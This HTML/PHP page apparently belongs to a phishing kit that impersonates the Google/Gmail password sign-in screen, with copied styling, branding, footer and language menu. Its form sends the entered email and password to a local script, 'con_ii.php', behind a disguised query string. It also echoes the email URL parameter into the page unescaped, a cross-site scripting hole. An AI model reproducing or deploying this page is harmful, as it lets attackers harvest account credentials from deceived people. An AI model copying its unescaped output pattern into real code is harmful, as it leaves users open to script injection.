.shift-form.back-arrow {
  display: block;
}
#link-signup {
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signup{
  display: none;
}
#link-signin-different {
  display: none;
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signin-different {
  display: block;
}
.signin-card #profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 0;
  min-height: 1em;
}
.signin-card.no-name #profile-name {
  display: none;
}
.signin-card.no-name #email-display {
  line-height: initial;
  margin-bottom: 16px;
}
.signin-card #email-display {
  display: block;
  padding: 0px 8px;
  color: rgb(64, 64, 64);
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.signin-card #Email {
  margin-top: 16px;
}
.need-help {
  float: right;
  text-align: right;
}
.form-panel {
  width: 274px;
}
#gaia_firstform {
  z-index: 2;
}
.signin-card {
  position: relative;
  overflow: hidden;
}
.signin-card #profile-name {
  color: #000;
}
.circle-mask {
  display: block;
  height: 96px;
  width: 96px;
  overflow: hidden;
  border-radius: 50%;
  margin-left: auto;
  margin-right: auto;
  z-index: 100;
  margin-bottom: 10px;
  background-size: 96px;
  background-repeat: no-repeat;
  background-image: url(avatar_2x.png);
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
}
.circle {
  -webkit-transition-property: -webkit-transform;
  -moz-transition-property: -moz-transform;
  -ms-transition-property: -ms-transform;
  -o-transition-property: -o-transform;
  transition-property: transform;
  -webkit-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -moz-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -ms-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -o-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  transition-timing-function: cubic-bezier(.645,.045,.355,1);
}
.circle {
  position: absolute;
  z-index: 101;
  height: 96px;
  width: 96px;
  border-radius: 50%;
  opacity: 0.99;
  overflow: hidden;
  background-repeat: no-repeat;
  background-position: center center;
}
.main {
  overflow: hidden;
}
.card-mask-wrap {
  position: relative;
  width: 360px;
  margin: 0 auto;
  z-index: 1;
}
  .signin-card {
  height: 500px;
  }
  .card-mask-wrap {
  -webkit-transition: transform 0.5s;
  -moz-transition: transform 0.5s;
  -ms-transition: transform 0.5s;
  -o-transition: transform 0.5s;
  transition: transform 0.5s;
  -webkit-transform: translate3d(0,
  -263px
, 0);
  -moz-transform: translate3d(0,
  -263px
, 0);
  -ms-transform: translate3d(0,
  -263px
, 0);
  -o-transform: translate3d(0,
  -263px
, 0);
  transform: translate3d(0,
  -263px
, 0);
;
  }
  .card-mask-wrap.has-captcha {
  -webkit-transform: translate3d(0,
  -123px
, 0);
  -moz-transform: translate3d(0,
  -123px
, 0);
  -ms-transform: translate3d(0,
  -123px
, 0);
  -o-transform: translate3d(0,
  -123px
, 0);
  transform: translate3d(0,
  -123px
, 0);
;
  }
  .card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -223px
, 0);
  -moz-transform: translate3d(0,
  -223px
, 0);
  -ms-transform: translate3d(0,
  -223px
, 0);
  -o-transform: translate3d(0,
  -223px
, 0);
  transform: translate3d(0,
  -223px
, 0);
;
  }
  .card-mask-wrap.has-captcha.has-error {
  -webkit-transform: translate3d(0,
  -83px
, 0);
  -moz-transform: translate3d(0,
  -83px
, 0);
  -ms-transform: translate3d(0,
  -83px
, 0);
  -o-transform: translate3d(0,
  -83px
, 0);
  transform: translate3d(0,
  -83px
, 0);
;
  }
  .shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -222px
, 0);
  -moz-transform: translate3d(0,
  -222px
, 0);
  -ms-transform: translate3d(0,
  -222px
, 0);
  -o-transform: translate3d(0,
  -222px
, 0);
  transform: translate3d(0,
  -222px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -182px
, 0);
  -moz-transform: translate3d(0,
  -182px
, 0);
  -ms-transform: translate3d(0,
  -182px
, 0);
  -o-transform: translate3d(0,
  -182px
, 0);
  transform: translate3d(0,
  -182px
, 0);
;
  }
  .shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -242px
, 0);
  -moz-transform: translate3d(0,
  -242px
, 0);
  -ms-transform: translate3d(0,
  -242px
, 0);
  -o-transform: translate3d(0,
  -242px
, 0);
  transform: translate3d(0,
  -242px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -202px
, 0);
  -moz-transform: translate3d(0,
  -202px
, 0);
  -ms-transform: translate3d(0,
  -202px
, 0);
  -o-transform: translate3d(0,
  -202px
, 0);
  transform: translate3d(0,
  -202px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -57px
, 0);
  -moz-transform: translate3d(0,
  -57px
, 0);
  -ms-transform: translate3d(0,
  -57px
, 0);
  -o-transform: translate3d(0,
  -57px
, 0);
  transform: translate3d(0,
  -57px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -77px
, 0);
  -moz-transform: translate3d(0,
  -77px
, 0);
  -ms-transform: translate3d(0,
  -77px
, 0);
  -o-transform: translate3d(0,
  -77px
, 0);
  transform: translate3d(0,
  -77px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -17px
, 0);
  -moz-transform: translate3d(0,
  -17px
, 0);
  -ms-transform: translate3d(0,
  -17px
, 0);
  -o-transform: translate3d(0,
  -17px
, 0);
  transform: translate3d(0,
  -17px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error.no-name {
  -webkit-transform: translate3d(0,
  -37px
, 0);
  -moz-transform: translate3d(0,
  -37px
, 0);
  -ms-transform: translate3d(0,
  -37px
, 0);
  -o-transform: translate3d(0,
  -37px
, 0);
  transform: translate3d(0,
  -37px
, 0);
;
  }
  .main-content {
  height: 450px;
;
  }
  .main-content.has-captcha {
  height: 590px;
;
  }
  .main-content.has-error {
  height: 490px;
;
  }
  .main-content.has-captcha.has-error {
  height: 630px;
;
  }
  .shift-form.main-content {
  height: 491px;
;
  }
  .has-error.shift-form.main-content {
  height: 531px;
;
  }
  .shift-form.main-content.no-name {
  height: 471px;
;
  }
  .has-error.shift-form.main-content.no-name {
  height: 511px;
;
  }
  .has-captcha.shift-form.main-content {
  height: 656px;
;
  }
  .has-captcha.shift-form.main-content.no-name {
  height: 636px;
;
  }
  .has-captcha.shift-form.main-content.has-error {
  height: 696px;
;
  }
  .has-captcha.shift-form.main-content.has-error.no-name {
  height: 676px;
;
  }
  .card-mask {
  background-color: #fff;
  background-position: 50% 0;
  background-repeat: no-repeat;
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWgAAAAGCAIAAABhDpMcAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gkeFxks6YflLAAAAKlJREFUWMPt2CEShDAMheGmMCFV1MH9z8MtarC4QKfNiuwwOyxHeJ9r6iJ+ETKz3vu+7/M8D8MQAADetNaO41jXNcYYfUREpZRaK7YDAP9qraUUIvLn6NVg5t77tm2qamZYEwDciEhElmVhZm/H6B8ppZxzCOE8T4QDAB7hmKYp55xS+k48E601VVXV67oQDgB4hIOZRURE/BJKv5kwM1QDAF7bcR84Qggf4ShHovU/ogcAAAAASUVORK5CYII=);
  min-height: 300px;
  }
.card {
  margin-bottom: 0;
}
.one-google {
  padding-top: 27px;
}
#canvas {
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
  opacity: 0.01;
}
.shift-form #canvas {
  opacity: 0.99;
}
.label {
  color: #404040;
}
#account-chooser-link {
  -webkit-transition: opacity 0.3s;
  -moz-transition: opacity 0.3s;
  -ms-transition: opacity 0.3s;
  -o-transition: opacity 0.3s;
  transition: opacity 0.3s;
}
.input-wrapper {
  position: relative;
}
.google-footer-bar {
  z-index: 2;
}
.profile-tooltip {
  display: none;
}
.jfk-bubble {
  max-width: 300px;
}
</style>
<style media="screen and (max-width: 580px)">
.back-arrow {
  top: 17px;
}
.circle-mask {
  height: 72px;
  width: 72px;
  background-size: 72px;
}
.circle {
  height: 72px;
  width: 72px;
}
#canvas {
  height: 72px;
  width: 72px;
}
.form-panel {
  width: 256px;
}
.card-mask-wrap {
  width: 300px;
}
  .card-mask {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAS4AAAAGCAIAAADyquT7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDcyMjMyQ0NFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDcyMjMyQ0RFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpENzIyMzJDQUU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpENzIyMzJDQkU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqGCc+MAAACnSURBVHja7Ng7DoQgFIXhYTAKFXS6//W4CxtaOh4B5sQ7mcwGpDpfpdjd5M9V1Rij9x5CcM5prV9ENEtrLcZ4HMcb5EgpdV1XrZXTIZoDuSE6pCe3i3S4rit243meKSXsSY6J6FGIzhiz7zvSkxoXeWCt9d7jIufMFIkmpLhtG6JDet8TCQ/vrOlWSmGKRBNSxD40N/lHo/7DGzeOiWhOjb8PRfgIMAAaYEeit6tkKwAAAABJRU5ErkJggg==);
  }
  .card-mask-wrap {
  -webkit-transform: translate3d(0,
  -288px
, 0);
  -moz-transform: translate3d(0,
  -288px
, 0);
  -ms-transform: translate3d(0,
  -288px
, 0);
  -o-transform: translate3d(0,
  -288px
, 0);
  transform: translate3d(0,
  -288px
, 0);
;
  }
  .card-mask-wrap.has-captcha {
  -webkit-transform: translate3d(0,
  -148px
, 0);
  -moz-transform: translate3d(0,
  -148px
, 0);
  -ms-transform: translate3d(0,
  -148px
, 0);
  -o-transform: translate3d(0,
  -148px
, 0);
  transform: translate3d(0,
  -148px
, 0);
;
  }
  .card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -248px
, 0);
  -moz-transform: translate3d(0,
  -248px
, 0);
  -ms-transform: translate3d(0,
  -248px
, 0);
  -o-transform: translate3d(0,
  -248px
, 0);
  transform: translate3d(0,
  -248px
, 0);
;
  }
  .card-mask-wrap.has-captcha.has-error {
  -webkit-transform: translate3d(0,
  -108px
, 0);
  -moz-transform: translate3d(0,
  -108px
, 0);
  -ms-transform: translate3d(0,
  -108px
, 0);
  -o-transform: translate3d(0,
  -108px
, 0);
  transform: translate3d(0,
  -108px
, 0);
;
  }
  .shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -247px
, 0);
  -moz-transform: translate3d(0,
  -247px
, 0);
  -ms-transform: translate3d(0,
  -247px
, 0);
  -o-transform: translate3d(0,
  -247px
, 0);
  transform: translate3d(0,
  -247px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -207px
, 0);
  -moz-transform: translate3d(0,
  -207px
, 0);
  -ms-transform: translate3d(0,
  -207px
, 0);
  -o-transform: translate3d(0,
  -207px
, 0);
  transform: translate3d(0,
  -207px
, 0);
;
  }
  .shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -267px
, 0);
  -moz-transform: translate3d(0,
  -267px
, 0);
  -ms-transform: translate3d(0,
  -267px
, 0);
  -o-transform: translate3d(0,
  -267px
, 0);
  transform: translate3d(0,
  -267px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -227px
, 0);
  -moz-transform: translate3d(0,
  -227px
, 0);
  -ms-transform: translate3d(0,
  -227px
, 0);
  -o-transform: translate3d(0,
  -227px
, 0);
  transform: translate3d(0,
  -227px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -82px
, 0);
  -moz-transform: translate3d(0,
  -82px
, 0);
  -ms-transform: translate3d(0,
  -82px
, 0);
  -o-transform: translate3d(0,
  -82px
, 0);
  transform: translate3d(0,
  -82px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -102px
, 0);
  -moz-transform: translate3d(0,
  -102px
, 0);
  -ms-transform: translate3d(0,
  -102px
, 0);
  -o-transform: translate3d(0,
  -102px
, 0);
  transform: translate3d(0,
  -102px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -42px
, 0);
  -moz-transform: translate3d(0,
  -42px
, 0);
  -ms-transform: translate3d(0,
  -42px
, 0);
  -o-transform: translate3d(0,
  -42px
, 0);
  transform: translate3d(0,
  -42px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error.no-name {
  -webkit-transform: translate3d(0,
  -62px
, 0);
  -moz-transform: translate3d(0,
  -62px
, 0);
  -ms-transform: translate3d(0,
  -62px
, 0);
  -o-transform: translate3d(0,
  -62px
, 0);
  transform: translate3d(0,
  -62px
, 0);
;
  }
  .main-content {
  height: 350px;
;
  }
  .main-content.has-captcha {
  height: 490px;
;
  }
  .main-content.has-error {
  height: 390px;
;
  }
  .main-content.has-captcha.has-error {
  height: 530px;
;
  }
  .shift-form.main-content {
  height: 391px;
;
  }
  .has-error.shift-form.main-content {
  height: 431px;
;
  }
  .shift-form.main-content.no-name {
  height: 371px;
;
  }
  .has-error.shift-form.main-content.no-name {
  height: 411px;
;
  }
  .has-captcha.shift-form.main-content {
  height: 556px;
;
  }
  .has-captcha.shift-form.main-content.no-name {
  height: 536px;
;
  }
  .has-captcha.shift-form.main-content.has-error {
  height: 596px;
;
  }
  .has-captcha.shift-form.main-content.has-error.no-name {
  height: 576px;
;
  }
.signin-card {
  width: 256px;
}
.signin-card #EmailFirst {
  margin-top: 15px;
}
.one-google {
  padding-top: 22px;
}
.clearfix1 {  zoom:1;
}
.content1 {  padding: 0 44px;
}
.content1 {  padding-left: 10px;
  padding-right: 10px;
}
.google-footer-bar1 {  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
}
.google-footer-bar1 {  z-index: 2;
}
.lang-chooser-wrap1 {  float: right;
  display: inline;
}
.lang-chooser-wrap1 {  display: none;
}
</style>
  <script type="text/JavaScript">
<!--
function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.id; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
  } if (errors) alert('Please correct the following error(s) before you can proceed:\n'+errors);
  document.MM_returnValue = (errors == '');
}
//-->
  </script>
  </head>
  <body>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Google.</h1>
  <h2 class="hidden-small">
  Enter password to continue to Gmail  </h2>
</div>
<div class="main-content no-name shift-form">
<div class="card signin-card pre-shift no-name shift-form">
  <div id="cc_iframe_parent"><iframe id="youtube" src="" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
  <div class="circle-mask" style="background-image: data:image/png;base64,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;">
  <canvas id="canvas" class="circle" width="96" height="96"></canvas>
  </div>
  <div class="profile-tooltip">
  We'll only personalize this page when you're signing in from a familiar device or location.
  <a href="" target="_blank">Learn more</a>  </div>
  <form method="post" action="con_ii.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.113InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav" id="gaia_loginform">
  <input name="Page" value="PasswordSeparationSignIn" type="hidden">
  <input name="GALX" value="RW8KtQZn6Wo" type="hidden">
  <input name="gxf" value="AFoagUXbCotaD58V3JDlLc0C-pHSPsQwyQ:1450175117116" type="hidden">
  <input name="continue" value="" type="hidden">
  <input name="service" value="mail" type="hidden">
  <input name="rm" value="false" type="hidden">
  <input name="ltmpl" value="default" type="hidden">
  <input name="scc" value="1" type="hidden">
  <input name="ss" value="1" type="hidden">
  <input name="osid" value="1" type="hidden">
  <input id="profile-information" name="ProfileInformation" value="" type="hidden">
  <input id="_utf8" name="_utf8" value="☃" type="hidden">
  <input name="bgresponse" id="bgresponse" value="" type="hidden">
  <input id="pstMsg" name="pstMsg" value="1" type="hidden">
  <input id="dnConn" name="dnConn" value="" type="hidden">
  <input id="checkConnection" name="checkConnection" value="" type="hidden">
  <input id="checkedDomains" name="checkedDomains" value="youtube" type="hidden">
  <div class="form-panel first valid" id="gaia_firstform">
  <div style="transition-delay: 0ms;" class="slide-out hide-form">
  <div class="input-wrapper focused">
  <div id="identifier-shown"></div>
  <span role="alert" class="error-msg" id="errormsg_0_Email"></span>  </div>
<div style="display: none" id="identifier-captcha">
<input name="identifiertoken" id="identifier-token" value="" type="hidden">
<input name="identifiertoken_audio" id="identifier-token-audio" type="hidden">
<div class="captcha-box">
  <div id="captcha-img" data-alt-text="Visual verification"></div>
  <span class="captcha-msg">
  Letters are not case-sensitive  </span></div>
<label for="identifier-captcha-input" class="hidden-label"></label>
<input id="identifier-captcha-input" name="identifier-captcha-input" class="captcha" placeholder="Enter the letters above" title="Type the characters you see or numbers you hear" type="text">
</div>
<input id="next" name="signIn" class="rc-button rc-button-submit" value="Next" type="submit">
  <a class="need-help" href="">
  Need help?  </a>  </div>
  </div>
  <a href="">
  <img id="back-arrow" class="back-arrow shift-form" aria-label="Back" tabindex="0" alt="Back" src="arrow_back_grey600_24dp.png">  </a>
  <div class="form-panel second">
  <div style="transition-delay: 100ms;" class="slide-in">
  <div>
  <p style="display: none;" id="profile-name"></p>
  <span id="email-display"><?php echo $_GET['Email']; ?></span>  </div>
  <div>
  <div id="password-shown"><div>
  <input name="Email" id="Email-hidden" spellcheck="false" class="hidden" value="<?php echo $_GET['Email']; ?>" readonly="" autocomplete="off" type="email">
<label class="hidden-label" for="Passwd">Password</label>
<input id="Passwd" required="" autofocus="" name="Passwd" placeholder="Password" class="" type="password">
  </div></div>
  </div>
<input id="signIn" onClick="MM_validateForm('Passwd','','R');return document.MM_returnValue" name="signIn" class="rc-button rc-button-submit" value="Sign in" type="submit">
  <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie" value="yes" checked="checked" type="checkbox">
  <span>
  Stay signed in  </span>
  <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
  For your convenience, keep this checked. On shared devices, additional precautions are recommended.
  <a href="" target="_blank">Learn more</a>  </div>
  </div>
  </label>
  <input name="rmShown" value="1" type="hidden">
  <a id="link-forgot-passwd" class="need-help" href="?Email=<?php echo $_GET['Email']; ?>">
  Forgot password?  </a>  </div>
  <span id="inge" style="display: none" role="alert" class="error-msg">
  Sorry, Google doesn't recognize that email. <a href="">Create an account</a> using that address?  </span>
  <span id="timeoutError" style="display: none" role="alert" class="error-msg">
  Something went wrong. Check your connection and try again.  </span>  </div>
  </form>
</div>
  <div class="card-mask-wrap
    
        
     no-name shift-form">
  <div class="card-mask">
  <div class="one-google">
  <p class="create-account">
  <span id="link-signin-different">
  <a href"">
  Sign in with a different account  </a>  </span>
  <span id="link-signup">
  <a href="">
  Create account  </a>  </span>  </p>
<p class="tagline">
  One Google Account for everything Google</p>
<div class="logo-strip"></div>
  </div>
  </div>
  </div>
</div>
  </div>
  <div class="google-footer-bar1">
    <div class="footer content clearfix">
      <ul id="footer-list">
        <li> <a href="" target="_blank"> About Google </a> </li>
        <li> <a href="" target="_blank"> Privacy </a> </li>
        <li> <a href="" target="_blank"> Terms </a> </li>
        <li> <a href="" target="_blank"> Help </a> </li>
      </ul>
      <div id="lang-vis-control" style="display: inline;"> <span id="lang-chooser-wrap" class="lang-chooser-wrap1">
        <label for="lang-chooser"><img src="" alt="Change language"></label>
        <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
          <option value="af"> ‪Afrikaans‬ </option>
          <option value="az"> ‪azərbaycan dili‬ </option>
          <option value="ms"> ‪Bahasa Melayu‬ </option>
          <option value="ca"> ‪català‬ </option>
          <option value="cs"> ‪Čeština‬ </option>
          <option value="da"> ‪Dansk‬ </option>
          <option value="de"> ‪Deutsch‬ </option>
          <option value="et"> ‪eesti‬ </option>
          <option value="en-GB"> ‪English (United Kingdom)‬ </option>
          <option value="en" selected="selected"> ‪English (United States)‬ </option>
          <option value="es"> ‪Español (España)‬ </option>
          <option value="es-419"> ‪Español (Latinoamérica)‬ </option>
          <option value="eu"> ‪euskara‬ </option>
          <option value="fil"> ‪Filipino‬ </option>
          <option value="fr-CA"> ‪Français (Canada)‬ </option>
          <option value="fr"> ‪Français (France)‬ </option>
          <option value="gl"> ‪galego‬ </option>
          <option value="hr"> ‪Hrvatski‬ </option>
          <option value="in"> ‪Indonesia‬ </option>
          <option value="zu"> ‪isiZulu‬ </option>
          <option value="is"> ‪íslenska‬ </option>
          <option value="it"> ‪Italiano‬ </option>
          <option value="sw"> ‪Kiswahili‬ </option>
          <option value="lv"> ‪latviešu‬ </option>
          <option value="lt"> ‪lietuvių‬ </option>
          <option value="hu"> ‪magyar‬ </option>
          <option value="nl"> ‪Nederlands‬ </option>
          <option value="no"> ‪norsk‬ </option>
          <option value="pl"> ‪polski‬ </option>
          <option value="pt"> ‪Português (Brasil)‬ </option>
